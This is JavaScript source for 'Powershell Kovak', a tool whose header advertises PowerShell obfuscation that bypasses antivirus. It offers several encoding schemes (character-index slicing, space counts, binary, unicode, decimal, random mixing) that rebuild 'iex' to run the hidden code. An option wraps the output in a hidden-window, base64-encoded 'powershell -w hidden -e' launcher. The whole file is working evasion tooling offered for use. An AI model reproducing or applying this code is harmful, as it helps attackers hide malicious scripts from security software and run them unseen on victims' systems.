/**
 * 
 * @author Madhanmaaz
 * @license MIT
 * @copyright 2025
 * @description Powershell Kovak is a powershell obfuscation tool, ((100 - 1) + 1)% bypassing antivirus.
 * 
 */

(function (exports) {
    class VariableNameGenerator {
        constructor() {
            this.index = 0;
            this.letters = Array.from({ length: 26 }, (_, i) => {
                return String.fromCharCode(97 + i)
            })
        }

        generate() {
            const letterIndex = this.index % 26
            const repeatCount = Math.floor(this.index / 26) + 1
            const letter = this.letters[letterIndex]
            this.index++
            return `_${letter.repeat(repeatCount)}`
        }
    }

    const variableNameGenerator = new VariableNameGenerator()
    function getVariable() {
        return variableNameGenerator.generate()
    }

    // base64 encode for powershell UTF-16LE
    function codeToBase64(code) {
        const buffer = new ArrayBuffer(code.length * 2)
        const view = new Uint16Array(buffer)
        for (let i = 0; i < code.length; i++) {
            view[i] = code.charCodeAt(i)
        }

        const uint8 = new Uint8Array(buffer)
        let binary = ''
        for (let i = 0; i < uint8.length; i++) {
            binary += String.fromCharCode(uint8[i])
        }

        return btoa(binary)
    }

    exports.sliceMethod = (psCode) => {
        const variable1 = getVariable()
        const variable2 = getVariable()
        const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&()*+,-./:;<=>?@[\\]^_{|}~\\t\\n\\r\\v\\f ' + "`'"

        function builder(data) {
            let value = ""
            for (let index = 0; index < data.length; index++) {
                const charIndex = chars.indexOf(data[index])
                value += `$${variable1}[${charIndex}]`

                if (index != (data.length - 1)) value += '+'
            }

            return value
        }

        const runner = `$${variable2}=$(${builder('iex')});`
        let output = `$${variable1}='${chars}'';${runner}`

        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue
            output += `&$${variable2}(${builder(element)});`
        }

        return output
    }

    exports.spaceMethod = (psCode) => {
        const variable1 = getVariable()
        function builder(data) {
            let value = ""
            for (let index = 0; index < data.length; index++) {
                const spaceCount = data[index].charCodeAt()
                value += `([char]('${' '.repeat(spaceCount)}'.Length))`
                if (index != (data.length - 1)) value += '+'
            }

            return value
        }

        const runner = `$${variable1}=$(${builder('iex')});`
        let output = runner
        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue

            output += `&$${variable1}(${builder(element)});`
        }

        return output
    }

    exports.binaryMethod = (psCode) => {
        const variable1 = getVariable()
        const variable2 = getVariable()
        const variable3 = getVariable()
        const variable4 = getVariable()
        const variable5 = getVariable()

        function builder(data) {
            const value = []
            for (let char of data) {
                value.push(`'${char.charCodeAt().toString(2).padStart(8, '0')}'`)
            }
            return `@(${value.join(',')})`
        }

        const runner = `$${variable1}=(${variable2}(${builder('iex')}));`
        let output = runner
        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue

            output += `&$${variable1}(${variable2}(${builder(element)}));`
        }

        return `function ${variable2}($${variable3}){$${variable4}='';foreach($${variable5} in $${variable3}){$${variable4}+=[char][Convert]::ToInt32($${variable5}, 2)};return $${variable4}};${output}`
    }

    exports.unicodeMethod = (psCode) => {
        const variable1 = getVariable()
        const variable2 = getVariable()
        const variable3 = getVariable()
        const variable4 = getVariable()
        const variable5 = getVariable()

        function builder(data) {
            let value = []
            for (let index = 0; index < data.length; index++) {
                value.push(`0x${data[index].codePointAt(0).toString(16)}`)
            }

            return `@(${value.join(',')})`
        }

        const runner = `$${variable1}=(${variable2}(${builder('iex')}));`
        let output = runner
        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue

            output += `&$${variable1}(${variable2}(${builder(element)}));`
        }

        return `function ${variable2}($${variable3}) {$${variable5}= '';foreach ($${variable4} in $${variable3}) {$${variable5} += [char]::ConvertFromUtf32($${variable4});};return $${variable5};};${output}`
    }

    exports.decimalMethod = (psCode) => {
        const variable1 = getVariable()

        function builder(data) {
            let value = ""
            for (let index = 0; index < data.length; index++) {
                const decimal = data[index].charCodeAt()
                value += `([char](${decimal}))`
                if (index != (data.length - 1)) value += '+'
            }

            return value
        }

        const runner = `$${variable1}=(${builder('iex')});`
        let output = runner
        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue
            output += `&$${variable1}(${builder(element)});`
        }

        return output
    }

    exports.randomv1Method = (psCode) => {
        let output = ''
        for (const element of psCode.split("\n")) {
            if(element.trim().length == 0) continue

            const keys = Object.keys(exports).filter(key => {
                if(key === "randomv1Method" || key === "run") return false
                return true
            })

            const key = keys[Math.floor(Math.random() * keys.length)]
            const randomMethod = exports[key]
            output += randomMethod(element)
        }
        return output
    }

    exports.run = (options) => {
        if (!options.code) return ""

        variableNameGenerator.index = 0

        const method = options.method
        const code = options.code
        const base64 = options.base64
        const hideWindow = options.hideWindow
        const output = exports[method](code)

        if (hideWindow) {
            return `powershell -w hidden -e ${codeToBase64(output)}`
        }

        if (base64) {
            return `powershell -e ${codeToBase64(output)}`
        }

        return output
    }
})(typeof module === "undefined" ? (window.psKovak = {}) : module.exports)